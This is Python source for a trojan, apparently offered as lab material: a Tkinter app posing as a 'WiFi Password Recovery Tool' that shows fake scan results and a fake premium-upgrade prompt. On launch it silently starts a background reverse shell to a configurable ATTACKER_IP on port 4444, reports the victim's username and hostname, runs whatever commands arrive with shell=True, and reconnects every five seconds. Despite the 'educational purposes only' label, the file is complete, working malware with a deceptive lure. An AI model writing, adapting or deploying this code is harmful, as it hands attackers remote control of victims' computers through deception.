#!/usr/bin/env python3
"""
WiFi Password Recovery Tool
A legitimate-looking application that secretly establishes a reverse shell
Educational purposes only - Use in controlled lab environment
"""

import socket
import subprocess
import os
import sys
import time
import tkinter as tk
from tkinter import messagebox, ttk
import threading

# Configuration - Change these values
ATTACKER_IP = "192.168.1.10"  # Replace with your Kali IP
ATTACKER_PORT = 4444

class WiFiRecoveryApp:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Password Recovery Tool v2.1")
        self.root.geometry("450x300")
        self.root.resizable(False, False)
        
        # Start reverse shell in background
        self.start_reverse_shell()
        
        # Create GUI
        self.create_gui()
    
    def create_gui(self):
        """Create the fake WiFi recovery GUI"""
        # Title
        title_label = tk.Label(self.root, text="WiFi Password Recovery Tool", 
                              font=("Arial", 16, "bold"))
        title_label.pack(pady=10)
        
        # Description
        desc_label = tk.Label(self.root, 
                             text="Recover saved WiFi passwords from your system",
                             font=("Arial", 10))
        desc_label.pack(pady=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(self.root, length=300, mode='indeterminate')
        self.progress.pack(pady=20)
        
        # Status label
        self.status_label = tk.Label(self.root, text="Ready to scan...", 
                                    font=("Arial", 9))
        self.status_label.pack(pady=5)
        
        # Buttons frame
        button_frame = tk.Frame(self.root)
        button_frame.pack(pady=20)
        
        # Scan button
        scan_btn = tk.Button(button_frame, text="Scan for WiFi Passwords", 
                           command=self.fake_scan, bg="#4CAF50", fg="white",
                           font=("Arial", 10, "bold"), width=20)
        scan_btn.pack(side=tk.LEFT, padx=5)
        
        # Exit button
        exit_btn = tk.Button(button_frame, text="Exit", 
                           command=self.root.quit, bg="#f44336", fg="white",
                           font=("Arial", 10, "bold"), width=10)
        exit_btn.pack(side=tk.LEFT, padx=5)
        
        # Results text area
        self.results_text = tk.Text(self.root, height=8, width=50)
        self.results_text.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(self.results_text)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.results_text.yview)
    
    def fake_scan(self):
        """Simulate WiFi password scanning"""
        self.progress.start()
        self.status_label.config(text="Scanning for saved networks...")
        
        # Clear previous results
        self.results_text.delete(1.0, tk.END)
        
        # Simulate scanning process
        self.root.after(2000, self.show_fake_results)
    
    def show_fake_results(self):
        """Show fake WiFi scan results"""
        self.progress.stop()
        self.status_label.config(text="Scan completed!")
        
        fake_results = """
WiFi Networks Found:
====================

Network: HomeNetwork_5G
Password: ********** (Protected)
Security: WPA2-PSK

Network: OfficeWiFi
Password: ********** (Protected) 
Security: WPA2-Enterprise

Network: GuestNetwork
Password: ********** (Protected)
Security: WPA2-PSK

⚠️ Note: For security reasons, passwords are hidden.
   Premium version required to view actual passwords.

Upgrade to Premium for $19.99 to unlock all features!
        """
        
        self.results_text.insert(tk.END, fake_results)
        
        # Show fake upgrade message
        messagebox.showinfo("Upgrade Required", 
                          "Premium version required to view passwords.\n"
                          "This demo version only shows available networks.")
    
    def start_reverse_shell(self):
        """Start reverse shell in background thread"""
        def run_shell():
            while True:
                try:
                    # Try to connect to attacker
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ATTACKER_IP, ATTACKER_PORT))
                    
                    # Send initial message
                    hostname = os.getenv('COMPUTERNAME', 'Unknown')
                    username = os.getenv('USERNAME', 'Unknown')
                    initial_msg = f"[+] WiFi Tool - Connection from {username}@{hostname}\n"
                    s.send(initial_msg.encode())
                    
                    # Command loop
                    while True:
                        try:
                            command = s.recv(1024).decode().strip()
                            if not command or command.lower() == 'exit':
                                break
                            
                            # Execute command
                            result = subprocess.run(command, shell=True, 
                                                  capture_output=True, text=True)
                            output = result.stdout
                            if result.stderr:
                                output += f"\nError: {result.stderr}"
                            
                            s.send(f"{output}\n".encode())
                        except:
                            break
                    
                    s.close()
                    time.sleep(5)
                
                except:
                    time.sleep(5)
                    continue
        
        # Start in daemon thread
        shell_thread = threading.Thread(target=run_shell, daemon=True)
        shell_thread.start()

def main():
    """Main function to run the disguised app"""
    root = tk.Tk()
    app = WiFiRecoveryApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()